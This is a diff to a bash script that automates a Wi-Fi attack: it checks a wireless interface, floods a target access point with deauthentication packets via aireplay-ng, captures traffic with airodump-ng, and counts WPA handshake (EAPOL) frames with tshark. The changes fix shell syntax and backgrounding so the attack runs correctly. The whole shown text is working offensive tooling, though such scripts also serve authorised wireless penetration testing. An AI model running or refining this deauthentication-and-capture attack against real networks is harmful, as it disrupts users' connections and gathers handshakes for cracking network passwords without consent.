@@ -31,7 +31,7 @@ else
         echo "Wireless interface name cannot be empty."
         echo ""
         exit 1
-    elif [[ ! iw dev "$interface" info &>/dev/null ]]; then
+    elif ! iw dev "$interface" info &>/dev/null; then
         echo "Invalid wireless interface. Please provide a valid wireless interface name."
         echo ""
         exit 1    
@@ -65,7 +65,7 @@ else
                 output_dir="pcap_files"
                 mkdir -p "$output_dir"
                 output_file="${output_dir}/${bssid}_${timestamp}"
-                xterm -e "aireplay-ng -0 0 -a $bssid $interface" & sleep 1 && xterm -e "airodump-ng --bssid $bssid -c $channel -w $output_file $interface"
+                xterm -e "aireplay-ng -0 0 -a $bssid $interface" & sleep 1 && xterm -e "airodump-ng --bssid $bssid -c $channel -w $output_file $interface" &
                 pcap_file="${output_file}-01.cap"
                 echo ""
                 handshakes=$(tshark -r "$pcap_file" -Y "eapol" -T fields -e wlan.bssid -e wlan.da -e wlan.sa -e eapol.keydes.type -E occurrence=f | wc -l)
@@ -81,6 +81,7 @@ else
                     echo ""
                     exit 1
                 fi
+            fi
         fi
     fi
-fi  
+fi
